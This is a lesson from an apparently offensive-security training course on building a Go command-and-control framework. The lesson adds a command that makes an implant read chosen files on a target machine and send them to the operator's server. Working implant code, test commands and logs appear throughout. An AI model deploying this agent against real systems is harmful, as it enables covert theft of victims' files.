---
layout: course01
title: "Lesson 22: Download Command"
---


## Solutions

- **Starting Code:** [lesson_22_begin](https://github.com/faanross/antisyphon_course_c2_golang/tree/master/lesson_22_begin)
- **Completed Code:** [lesson_22_end](https://github.com/faanross/antisyphon_course_c2_golang/tree/master/lesson_22_end)

## Overview

Now that we have a complete command execution framework, let's see how easy it is to add new commands. This is the "payoff" lesson - the architecture we've built makes extension trivial.

We'll implement a **download command** that:

1. Operator specifies a file path on the agent's machine
2. Agent reads that file
3. Agent sends the file contents back to the server
4. Server saves the file to a `downloads/` directory

This demonstrates that adding new capabilities follows a predictable pattern:

1. Create argument and result types
2. Add validator on server (processor only if transformation needed)
3. Add orchestrator on agent
4. Add doer on agent
5. Add result handler on server (if special handling needed)
6. Register the command

Let's see how quickly we can add a complete new command!

## What We'll Create

- `DownloadArgs` type in `control/models.go`
- `DownloadResult` type in `models/results.go`
- `validateDownloadCommand` in `control/download.go`
- `orchestrateDownload` in `agent/download.go`
- `handleDownloadResult` in `server/server_https.go` (to save files to disk)
- Registry updates for the new command

## Part 1: Server-Side Types and Processing

### Create Argument Types

For download, the client and agent need identical information - just a file path. Unlike shellcode (where we transform a file path into base64-encoded data), no processing is needed. So we use a single type. Add to `control/models.go`:

```go
// DownloadArgs - arguments for download command (no transformation needed)
type DownloadArgs struct {
	FilePath string `json:"file_path"` // Path on agent's machine
}
```

- **DownloadArgs** - The operator specifies a file path on the target machine. Since no transformation is needed, we use one type for both client and agent.

Now add the result type to `models/results.go`:

```go
// DownloadResult - what the agent sends back
type DownloadResult struct {
	FilePath    string `json:"file_path"`
	FileData    string `json:"file_data"`    // Base64 encoded file contents
	FileSize    int64  `json:"file_size"`    // Original file size in bytes
	Success     bool   `json:"success"`
	ErrorMsg    string `json:"error,omitempty"`
}
```

- **DownloadResult** - Contains the file data (base64 encoded), size, and success status

### Create Validator

Create `internal/control/download.go`:

```go
package control

import (
	"encoding/json"
	"fmt"
	"log"
)

// validateDownloadCommand validates "download" command arguments from client
func validateDownloadCommand(rawArgs json.RawMessage) error {
	if len(rawArgs) == 0 {
		return fmt.Errorf("download command requires arguments")
	}

	var args DownloadArgs

	if err := json.Unmarshal(rawArgs, &args); err != nil {
		return fmt.Errorf("invalid argument format: %w", err)
	}

	if args.FilePath == "" {
		return fmt.Errorf("file_path is required")
	}

	log.Printf("Download validation passed: file_path=%s", args.FilePath)
	return nil
}
```

**Note:** Unlike shellcode (which needs a processor to read the file and base64-encode it), download doesn't need any transformation - the arguments pass straight through to the agent. When no processing is required, we skip the processor entirely.

### Register the Command

Add to the `validCommands` map in `control/command_api.go`:

```go
var validCommands = map[string]struct {
	Validator CommandValidator
	Processor CommandProcessor
}{
	"shellcode": {
		Validator: validateShellcodeCommand,
		Processor: processShellcodeCommand,
	},
	"download": {  // NEW - validator only, no processor needed
		Validator: validateDownloadCommand,
	},
}
```

That's it for the server side! Notice that download only needs a validator - the processor is optional and we skip it when no transformation is required.

## Part 2: Agent-Side Implementation

### Create the Orchestrator

Create `agent/download.go`:

```go
package agent

import (
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"os"

	"your-module/internal/control"
	"your-module/internal/models"
	"your-module/internal/server"
)

// orchestrateDownload is the orchestrator for the "download" command
func (agent *HTTPSAgent) orchestrateDownload(job *server.HTTPSResponse) AgentTaskResult {

	// Unmarshal the arguments
	var downloadArgs control.DownloadArgs
	if err := json.Unmarshal(job.Arguments, &downloadArgs); err != nil {
		errMsg := fmt.Sprintf("Failed to unmarshal DownloadArgs for Task ID %s: %v", job.JobID, err)
		log.Printf("|ERR DOWNLOAD ORCHESTRATOR| %s", errMsg)
		return AgentTaskResult{
			JobID:   job.JobID,
			Success: false,
			Error:   errors.New("failed to unmarshal DownloadArgs"),
		}
	}

	log.Printf("|DOWNLOAD ORCHESTRATOR| Task ID: %s. Downloading file: %s",
		job.JobID, downloadArgs.FilePath)

	// Agent-side validation
	if downloadArgs.FilePath == "" {
		log.Printf("|ERR DOWNLOAD ORCHESTRATOR| Task ID %s: FilePath is empty.", job.JobID)
		return AgentTaskResult{
			JobID:   job.JobID,
			Success: false,
			Error:   errors.New("FilePath cannot be empty"),
		}
	}

	// Call the doer
	result := doDownload(downloadArgs.FilePath)

	// Build the final result
	finalResult := AgentTaskResult{
		JobID: job.JobID,
	}

	outputJSON, _ := json.Marshal(result)
	finalResult.CommandResult = outputJSON

	if !result.Success {
		log.Printf("|ERR DOWNLOAD ORCHESTRATOR| Download failed for TaskID %s: %s",
			job.JobID, result.ErrorMsg)
		finalResult.Error = errors.New(result.ErrorMsg)
		finalResult.Success = false
	} else {
		log.Printf("|DOWNLOAD SUCCESS| Downloaded %d bytes from %s for TaskID %s",
			result.FileSize, downloadArgs.FilePath, job.JobID)
		finalResult.Success = true
	}

	return finalResult
}

// doDownload performs the actual file reading
func doDownload(filePath string) models.DownloadResult {
	result := models.DownloadResult{
		FilePath: filePath,
	}

	// Check if file exists
	fileInfo, err := os.Stat(filePath)
	if err != nil {
		result.Success = false
		result.ErrorMsg = fmt.Sprintf("file not found: %v", err)
		return result
	}

	// Check if it's a regular file (not directory)
	if fileInfo.IsDir() {
		result.Success = false
		result.ErrorMsg = "path is a directory, not a file"
		return result
	}

	result.FileSize = fileInfo.Size()

	// Read the file
	file, err := os.Open(filePath)
	if err != nil {
		result.Success = false
		result.ErrorMsg = fmt.Sprintf("failed to open file: %v", err)
		return result
	}
	defer file.Close()

	fileBytes, err := io.ReadAll(file)
	if err != nil {
		result.Success = false
		result.ErrorMsg = fmt.Sprintf("failed to read file: %v", err)
		return result
	}

	// Encode to base64 for safe JSON transmission
	result.FileData = base64.StdEncoding.EncodeToString(fileBytes)
	result.Success = true

	log.Printf("|DOWNLOAD DOER| Read %d bytes from %s", len(fileBytes), filePath)
	return result
}
```

### Breaking Down the Doer

**Check if file exists:**

```go
fileInfo, err := os.Stat(filePath)
if err != nil {
    result.Success = false
    result.ErrorMsg = fmt.Sprintf("file not found: %v", err)
    return result
}
```

`os.Stat` returns file information. If the file doesn't exist, we return an error immediately.

**Check if it's a regular file:**

```go
if fileInfo.IsDir() {
    result.Success = false
    result.ErrorMsg = "path is a directory, not a file"
    return result
}
```

Prevent downloading directories (which would fail anyway).

**Read and encode:**

```go
fileBytes, err := io.ReadAll(file)
result.FileData = base64.StdEncoding.EncodeToString(fileBytes)
```

Read all bytes and encode to base64 for safe JSON transmission.

### Register the Orchestrator

Update `registerCommands()` in `agent/commands.go`:

```go
func registerCommands(agent *HTTPSAgent) {
	agent.commandOrchestrators["shellcode"] = (*HTTPSAgent).orchestrateShellcode
	agent.commandOrchestrators["download"] = (*HTTPSAgent).orchestrateDownload  // NEW
}
```

Done! The download command is now fully functional.

## Understanding the Pattern

Look how consistent this is with shellcode:

| Step | Shellcode | Download |
|------|-----------|----------|
| 1. Types | ShellcodeArgsClient/Agent (different) | DownloadArgs (single) |
| 2. Validator | validateShellcodeCommand | validateDownloadCommand |
| 3. Processor | processShellcodeCommand | *none needed* |
| 4. Orchestrator | orchestrateShellcode | orchestrateDownload |
| 5. Doer | DoShellcode (interface) | doDownload (simple func) |
| 6. Register | Add to validCommands | Add to validCommands |

The key insight: **shellcode needs a processor** because the server transforms arguments (reads file, encodes to base64). **Download doesn't** - the file path passes through unchanged. The architecture supports both patterns elegantly.

## Part 3: Server-Side Result Handling

We've built the agent-side logic, but there's one more piece: when the agent sends back the file data, the server needs to **save it to disk**. Currently, `ResultHandler` just logs results - we need to detect download results and handle them specially.

### Define the Download Directory

First, add a constant to `server/server_https.go` that defines where downloaded files will be saved:

```go
// DownloadDirectory is where downloaded files are saved
const DownloadDirectory = "./downloads"
```

This creates a `downloads/` folder in whatever directory the server is run from. You can change this path to save files elsewhere.

### Update ResultHandler

Now update the `ResultHandler` function to detect and handle download results:

```go
// ResultHandler receives and displays the result from the Agent
func ResultHandler(w http.ResponseWriter, r *http.Request) {
	log.Printf("Endpoint %s has been hit by agent\n", r.URL.Path)

	var result models.AgentTaskResult

	// Decode the incoming result
	if err := json.NewDecoder(r.Body).Decode(&result); err != nil {
		log.Printf("ERROR: Failed to decode JSON: %v", err)
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode("error decoding JSON")
		return
	}

	// Try to detect if this is a download result
	if len(result.CommandResult) > 0 {
		var downloadResult models.DownloadResult
		if err := json.Unmarshal(result.CommandResult, &downloadResult); err == nil {
			// Check if it has file_data - that confirms it's a download result
			if downloadResult.FileData != "" {
				handleDownloadResult(result.JobID, &downloadResult)
				return
			}
		}
	}

	// Not a download result - handle as generic result
	var messageStr string
	if len(result.CommandResult) > 0 {
		if err := json.Unmarshal(result.CommandResult, &messageStr); err != nil {
			log.Printf("ERROR: Failed to unmarshal CommandResult: %v", err)
			messageStr = string(result.CommandResult)
		}
	}

	if !result.Success {
		log.Printf("Job (ID: %s) has failed\nMessage: %s\nError: %v", result.JobID, messageStr, result.Error)
	} else {
		log.Printf("Job (ID: %s) has succeeded\nMessage: %s", result.JobID, messageStr)
	}
}
```

### Create the Download Handler

Add this function to save downloaded files:

```go
// handleDownloadResult processes and saves a download result
func handleDownloadResult(jobID string, downloadResult *models.DownloadResult) {
	if !downloadResult.Success {
		log.Printf("Job (ID: %s) DOWNLOAD FAILED: %s", jobID, downloadResult.ErrorMsg)
		return
	}

	// Decode the base64 file data
	fileData, err := base64.StdEncoding.DecodeString(downloadResult.FileData)
	if err != nil {
		log.Printf("Job (ID: %s) ERROR: Failed to decode base64 file data: %v", jobID, err)
		return
	}

	// Create downloads directory if it doesn't exist
	if err := os.MkdirAll(DownloadDirectory, 0755); err != nil {
		log.Printf("Job (ID: %s) ERROR: Failed to create downloads directory: %v", jobID, err)
		return
	}

	// Extract just the filename from the path (handles both Windows and Unix paths)
	filename := filepath.Base(downloadResult.FilePath)
	// Prefix with job ID to avoid collisions
	savedFilename := fmt.Sprintf("%s_%s", jobID, filename)
	savedPath := filepath.Join(DownloadDirectory, savedFilename)

	// Write the file
	if err := os.WriteFile(savedPath, fileData, 0644); err != nil {
		log.Printf("Job (ID: %s) ERROR: Failed to save file: %v", jobID, err)
		return
	}

	log.Printf("Job (ID: %s) DOWNLOAD SUCCESS: Saved %d bytes to %s (original: %s)",
		jobID, len(fileData), savedPath, downloadResult.FilePath)
}
```

**How it works:**

1. **Detection** - We try to unmarshal the result as `DownloadResult`. If it has a `FileData` field, it's a download.
2. **Decode** - The file data arrives as base64, so we decode it back to raw bytes.
3. **Save** - We create a `downloads/` directory (if needed) and save the file with the job ID prefix to avoid name collisions.

## Test

Let's test the download command!

**Start the server:**

```bash
go run ./cmd/server
```

**Start the agent:**

You can run the agent locally on your development machine for testing:

```bash
go run ./cmd/agent
```

*If you want to test on a separate Windows system, you'll need to recompile and transfer the agent again since we've made changes since lesson 20:*

```bash
GOOS=windows GOARCH=amd64 go build -o agent.exe ./cmd/agent
```

**Queue a download command:**

```bash
curl -X POST http://localhost:8080/command -d '{"command": "download", "data": {"file_path": "C:/Users/tresa/OneDrive/Desktop/test.txt"}}'
```

*This is a file on my target system - replace the path with a file that exists on your agent's machine.*

**Expected client response:**

```bash
"Received command: download"
```

**Expected server output:**

```bash
2025/11/08 14:22:05 Received command: download
2025/11/08 14:22:05 Download validation passed: file_path=C:/Users/tresa/OneDrive/Desktop/test.txt
2025/11/08 14:22:05 QUEUED: download
2025/11/08 14:22:08 Endpoint / has been hit by agent
2025/11/08 14:22:08 DEQUEUED: Command 'download'
2025/11/08 14:22:08 Sending command to agent: download
2025/11/08 14:22:08 Job ID: job_582947
2025/11/08 14:22:08 Endpoint /results has been hit by agent
2025/11/08 14:22:08 Job (ID: job_582947) DOWNLOAD SUCCESS: Saved 42 bytes to downloads/job_582947_test.txt (original: C:/Users/tresa/OneDrive/Desktop/test.txt)
```

**Verify the download:** Check your `downloads/` directory - you should see the file saved with the job ID prefix:

```bash
ls -la downloads/
cat downloads/job_582947_test.txt
```

**Expected agent output:**

```bash
2025/11/08 14:22:08 Job received from Server
-> Command: download
-> JobID: job_582947
2025/11/08 14:22:08 AGENT IS NOW PROCESSING COMMAND download with ID job_582947
2025/11/08 14:22:08 |DOWNLOAD ORCHESTRATOR| Task ID: job_582947. Downloading file: C:/Users/tresa/OneDrive/Desktop/test.txt
2025/11/08 14:22:08 |DOWNLOAD DOER| Read 42 bytes from C:/Users/tresa/OneDrive/Desktop/test.txt
2025/11/08 14:22:08 |DOWNLOAD SUCCESS| Downloaded 42 bytes from C:/Users/tresa/OneDrive/Desktop/test.txt for TaskID job_582947
2025/11/08 14:22:08 |AGENT TASK|-> Sending result for Task ID job_582947 (142 bytes)...
2025/11/08 14:22:08 SUCCESSFULLY SENT FINAL RESULTS BACK TO SERVER.
```

**Test error handling (file not found):**

```bash
curl -X POST http://localhost:8080/command -d '{"command": "download", "data": {"file_path": "/nonexistent/file.txt"}}'
```

The agent will return an error result with "file not found" message.

## The Payoff

This lesson demonstrates the value of good architecture:

1. **Time to implement:** Adding download took us ~100 lines of straightforward code
2. **No RunLoop changes:** The execution framework handled everything
3. **Consistent patterns:** Same structure as shellcode, easy to understand
4. **Error handling:** Built into the framework automatically
5. **Result delivery:** The SendResult infrastructure was already there

Every future command you add will follow this same pattern:

- Upload (send file to agent)
- Execute (run shell command)
- Screenshot (capture screen)
- Keylogger (start/stop)
- Process list (enumerate running processes)

The hard work of building the framework pays dividends with every new capability.

## Conclusion

In this lesson, we demonstrated framework extensibility:

- Created a single `DownloadArgs` type (no transformation needed)
- Implemented server-side validation (no processor required)
- Created the agent-side orchestrator and doer
- Added server-side result handling to save downloaded files to disk
- Registered the command in both server and agent
- Tested the complete flow
- Understood when to use processors vs. skip them

This "payoff" lesson shows that the architecture we built in previous lessons makes extending the framework fast and predictable. Commands that need transformation (like shellcode) use processors; commands that don't (like download) can skip them entirely.

In the next (and final) lesson, we'll implement persistence - making the agent survive reboots!

---

<div style="display: flex; justify-content: space-between; margin-top: 2rem;">
<div><a href="/courses/course01/lesson-21">← Previous: Lesson 21</a></div>
<div><a href="/courses/course01">↑ Table of Contents</a></div>
<div><a href="/courses/course01/lesson-23">Next: Lesson 23 →</a></div>
</div>